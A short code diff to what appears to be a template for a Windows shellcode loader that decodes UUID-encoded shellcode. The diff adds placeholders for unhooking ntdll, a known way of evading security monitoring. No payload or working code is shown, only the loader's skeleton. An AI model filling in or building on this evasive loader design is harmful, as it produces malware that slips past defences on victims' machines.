@@ -4,6 +4,8 @@
 
 // {{UNHOOK_PLACEHOLDER}}
 
+// {{NTDLL_UNHOOK_FUNCTION_PLACEHOLDER}}
+
 // {{DEOBFUSCATION_FUNCTION_PLACEHOLDER}}
 // {{DECRYPTION_FUNCTION_PLACEHOLDER}}
 
@@ -20,6 +22,8 @@ unsigned char key[] = {
 };
 
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nShowCmd) {
+    // {{NTDLL_UNHOOK_CALL_PLACEHOLDER}}
+    
     int uuid_count = sizeof(shellcode_uuids) / sizeof(shellcode_uuids[0]);
     int shellcode_size = uuid_count * 16;
 
